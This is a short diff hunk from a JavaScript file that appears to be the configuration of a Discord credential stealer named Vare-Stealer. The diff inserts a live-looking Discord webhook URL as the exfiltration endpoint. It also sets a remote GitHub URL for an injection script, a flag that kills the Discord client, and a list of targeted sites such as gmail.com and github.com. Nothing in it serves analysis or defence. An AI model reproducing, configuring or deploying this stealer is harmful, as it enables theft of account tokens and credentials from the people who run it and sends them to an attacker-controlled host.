@@ -16,7 +16,7 @@ const buf_replace = require('buffer-replace');
 let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
-const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %webhookstring% = "https://discord.com/api/webhooks/1476331149776392192/IpgAIX0iSnjWiWtBxrBKTYwgcdKedTUiR7zagi138h8_t0OrCj7EBsJmOoEMkq_5IqK_"
 const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
